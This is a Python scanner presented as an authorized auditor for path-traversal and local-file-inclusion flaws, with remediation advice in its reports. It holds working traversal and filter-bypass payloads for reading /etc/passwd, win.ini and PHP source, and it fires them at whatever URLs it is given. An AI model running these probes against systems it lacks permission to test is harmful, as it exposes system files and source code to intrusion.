#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
LFI-Path-Hunter: Authorized Path Traversal & LFI Regression Auditor
-------------------------------------------------------------------
Zero-dependency Python 3 CLI for verifying path-validation controls on
authorized targets and local test fixtures. Uses raw http.client requests
so traversal sequences are not collapsed client-side (like curl --path-as-is).
"""

import argparse
import base64
import http.client
import json
import os
import re
import time
import urllib.parse
from dataclasses import dataclass, asdict
from typing import List, Optional, Tuple


TOP_LFI_PARAMS = [
    "page", "file", "path", "doc", "include", "view", "template", "layout",
    "dir", "folder", "download", "action", "cat", "board", "date", "detail",
    "prefix", "inc", "locate", "show", "site", "type", "content", "mod", "conf",
]

DEFAULT_PROBES = [
    ("Direct Linux Traversal", "../../../../../../../etc/passwd", r"root:.*:0:0:"),
    ("Non-Recursive Strip Bypass", "....//....//....//....//etc/passwd", r"root:.*:0:0:"),
    ("Double URL Encoding", "..%252f..%252f..%252f..%252fetc%252fpasswd", r"root:.*:0:0:"),
    ("Direct Windows Traversal", "..\\..\\..\\..\\Windows\\win.ini", r"\[fonts\]|\[extensions\]"),
    ("PHP Filter Base64 Disclosure", "php://filter/convert.base64-encode/resource=index.php", r"[A-Za-z0-9+/]{20,}={0,2}"),
]


@dataclass
class Finding:
    parameter: str
    technique: str
    probe: str
    status_code: int
    evidence: str
    remediation: str


def send_raw_get(base_url: str, param: str, value: str, timeout: float = 5.0) -> Tuple[int, str]:
    """Send HTTP GET without client-side path normalization."""
    parsed = urllib.parse.urlparse(base_url)
    query_dict = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    parts = [f"{k}={urllib.parse.quote(v[0], safe='')}" for k, v in query_dict.items() if k != param]
    parts.append(f"{param}={value}")
    raw_target = f"{parsed.path or '/'}?{'&'.join(parts)}"

    conn_cls = http.client.HTTPSConnection if parsed.scheme == "https" else http.client.HTTPConnection
    conn = conn_cls(parsed.hostname, parsed.port, timeout=timeout)
    try:
        conn.request("GET", raw_target, headers={"User-Agent": "LFI-Path-Hunter-Auditor/1.0"})
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, body
    finally:
        conn.close()


def load_lines(file_path: str) -> List[str]:
    """Load non-empty, non-comment lines from a wordlist or URL list file."""
    with open(file_path, "r", encoding="utf-8", errors="ignore") as fh:
        return [line.strip() for line in fh if line.strip() and not line.strip().startswith("#")]


def check_evidence(technique: str, body: str, pattern: str) -> Optional[str]:
    """Verify if response body contains expected indicator (including Base64 PHP check)."""
    match = re.search(pattern, body, re.IGNORECASE)
    if not match:
        return None
    if "Base64" in technique:
        try:
            decoded = base64.b64decode(match.group(0)).decode("utf-8", errors="ignore")
            if "<?php" in decoded or "<?=" in decoded:
                return f"Decoded PHP source snippet ({len(decoded)} chars)"
            return None
        except Exception:
            return None
    return match.group(0)[:80]


def audit_url(
    url: str,
    params: Optional[List[str]] = None,
    delay: float = 0.05,
    custom_canary: Optional[Tuple[str, str]] = None,
    wordlist_path: Optional[str] = None,
    match_regex: str = r"root:.*:0:0:|\[fonts\]|\[extensions\]",
) -> List[Finding]:
    """Run read-only path-validation audit across target parameters."""
    parsed = urllib.parse.urlparse(url)
    existing_params = list(urllib.parse.parse_qs(parsed.query, keep_blank_values=True).keys())
    target_params = params or (existing_params if existing_params else TOP_LFI_PARAMS[:10])

    probes = list(DEFAULT_PROBES)
    if wordlist_path:
        custom_probes = [(f"Wordlist ({os.path.basename(wordlist_path)})", w, match_regex) for w in load_lines(wordlist_path)]
        probes = custom_probes + probes
    if custom_canary:
        probes.insert(0, ("Custom Canary Probe", custom_canary[0], re.escape(custom_canary[1])))

    findings: List[Finding] = []
    for p in target_params:
        for tech, probe, pattern in probes:
            try:
                status, body = send_raw_get(url, p, probe)
                ev = check_evidence(tech, body, pattern)
                if ev:
                    findings.append(Finding(
                        parameter=p,
                        technique=tech,
                        probe=probe,
                        status_code=status,
                        evidence=ev,
                        remediation=(
                            "Use an allowlist / ID-to-path mapping; canonicalize with realpath() or "
                            "filepath.Rel(), and disable allow_url_include in PHP."
                        ),
                    ))
                    break
            except Exception:
                continue
            if delay > 0:
                time.sleep(delay)
    return findings


def write_markdown_report(url: str, findings: List[Finding], out_path: str) -> None:
    """Save a structured Markdown audit report with hardening steps."""
    lines = [
        "# 🛡️ LFI-Path-Hunter Audit Report",
        f"- **Target URL:** `{url}`",
        f"- **Findings Count:** `{len(findings)}`",
        "",
    ]
    if not findings:
        lines.append("✅ No path traversal or LFI indicators detected for the tested probes.")
    else:
        lines.extend([
            "| Parameter | Technique | Probe | Status | Evidence |",
            "| :--- | :--- | :--- | :---: | :--- |",
        ])
        for f in findings:
            lines.append(f"| `{f.parameter}` | {f.technique} | `{f.probe}` | {f.status_code} | `{f.evidence}` |")
        lines.extend([
            "",
            "## 🔧 Recommended Hardening",
            "1. Map numeric IDs to fixed server-side paths instead of accepting filenames.",
            "2. Canonicalize paths (`realpath()` / `filepath.EvalSymlinks`) **before** checking base directory prefix.",
            "3. Set `allow_url_include = Off` and restrict `open_basedir` in PHP.",
        ])
    with open(out_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines) + "\n")


def main() -> None:
    parser = argparse.ArgumentParser(description="Authorized Path Traversal & LFI Regression Auditor")
    target_grp = parser.add_mutually_exclusive_group(required=True)
    target_grp.add_argument("--url", help="Authorized target URL (e.g. http://127.0.0.1:8080/view?page=home)")
    target_grp.add_argument("--urls-file", "-uL", help="Text file with one target URL per line")
    parser.add_argument("--wordlist", "-w", help="Custom LFI/traversal wordlist file (one probe per line)")
    parser.add_argument("--regex", default=r"root:.*:0:0:|\[fonts\]|\[extensions\]",
                        help="Custom evidence regex for wordlist matches")
    parser.add_argument("--params", nargs="*", help="Specific parameters to test")
    parser.add_argument("--delay", type=float, default=0.05, help="Delay between requests (seconds)")
    parser.add_argument("--report", help="Optional Markdown report output path")
    parser.add_argument("--json", dest="json_out", help="Optional JSON report output path")
    args = parser.parse_args()

    targets = [args.url] if args.url else load_lines(args.urls_file)
    all_findings: List[Finding] = []
    for target in targets:
        print(f"[*] Auditing authorized target: {target}")
        found = audit_url(
            target,
            params=args.params,
            delay=args.delay,
            wordlist_path=args.wordlist,
            match_regex=args.regex,
        )
        all_findings.extend(found)
        for f in found:
            print(f"  [!] param={f.parameter} | {f.technique} | evidence={f.evidence}")

    print(f"[+] Completed. Total findings: {len(all_findings)}")
    if args.report:
        write_markdown_report(", ".join(targets), all_findings, args.report)
        print(f"[+] Markdown report saved: {args.report}")
    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as fh:
            json.dump([asdict(f) for f in all_findings], fh, indent=2)
        print(f"[+] JSON report saved: {args.json_out}")


if __name__ == "__main__":
    main()
